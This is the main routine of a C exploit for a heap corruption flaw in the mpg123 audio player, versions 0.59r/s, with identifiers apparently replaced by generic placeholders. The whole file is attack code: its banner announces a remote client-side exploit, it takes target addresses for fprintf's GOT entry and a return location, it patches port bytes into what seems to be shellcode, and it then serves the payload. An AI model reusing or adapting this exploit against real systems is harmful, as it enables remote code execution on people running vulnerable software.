
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {char* p_name; int p_gotaddr; int p_requestaddr; int p_retoffset; } ;


 int VAR_0 ;
 size_t FUNC_0 (int ) ;
 char* FUNC_1 () ;
 int FUNC_2 (int ) ;
 int FUNC_3 (int,char**,char*) ;
 int FUNC_4 (char*) ;
 int VAR_1 ;
 int VAR_2 ;
 int FUNC_5 () ;
 size_t VAR_3 ;
 int FUNC_6 (char*,...) ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int FUNC_7 (int ,char*,int*) ;
 TYPE_1__* VAR_7 ;
 int FUNC_8 (char*) ;
 int* VAR_8 ;

int FUNC_9(int VAR_9,char **VAR_10){
 unsigned int VAR_11=0;
 int VAR_12=0;
 char *VAR_13, *VAR_14="none";
 FUNC_6("[*] mpg123[v0.59r,v0.59s]: remote client-side heap corruption"
 " exploit.\n[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo/realh"
 "alo)\n\n");
 while((VAR_12=FUNC_3(VAR_9,VAR_10,"p:s:g:r:+:t:l"))!=VAR_0){
  switch(VAR_12){
   case 'p':
    VAR_3=FUNC_0(VAR_2);
    break;
   case 's':
    VAR_6=FUNC_0(VAR_2);
    break;
   case 'g':
    FUNC_7(VAR_2,"%x",&VAR_1);
    break;
   case 'r':
    FUNC_7(VAR_2,"%x",&VAR_4);
    break;
   case '+':
    VAR_5=(FUNC_0(VAR_2)*4);
    break;
   case 't':
    VAR_11=0;
    while(VAR_7[VAR_11].p_name)VAR_11++;
    if(FUNC_0(VAR_2)>=VAR_11)
     FUNC_6("[!] %u is not a valid target, ignored.\n",FUNC_0(VAR_2));
    else{
     VAR_14=VAR_7[FUNC_0(VAR_2)].p_name;
     VAR_1=VAR_7[FUNC_0(VAR_2)].p_gotaddr;
     VAR_4=VAR_7[FUNC_0(VAR_2)].p_requestaddr;
     VAR_5=(VAR_7[FUNC_0(VAR_2)].p_retoffset*4);
    }
    break;
   case 'l':
    FUNC_5();
    break;
   default:
    FUNC_8(VAR_10[0]);
    break;
  }
 }
 if(!VAR_3)FUNC_8(VAR_10[0]);

 FUNC_6("[*] platform value base\t\t: %s.\n",VAR_14);
 FUNC_6("[*] fprintf GOT address\t\t: 0x%.8x.\n",VAR_1);
 FUNC_6("[*] *request address location\t: 0x%.8x.\n",VAR_4);
 FUNC_6("[*] *request offset(+?*4)\t: %u(=%u), ret=0x%.8x.\n\n",
 (VAR_5/4),VAR_5,(VAR_4+VAR_5));

 VAR_8[33]=(VAR_6&0xff00)>>8;
 VAR_8[34]=(VAR_6&0x00ff);

 VAR_13=FUNC_1();

 FUNC_4(VAR_13);
 FUNC_6("[!] exploit failed.\n");
 FUNC_2(0);
}
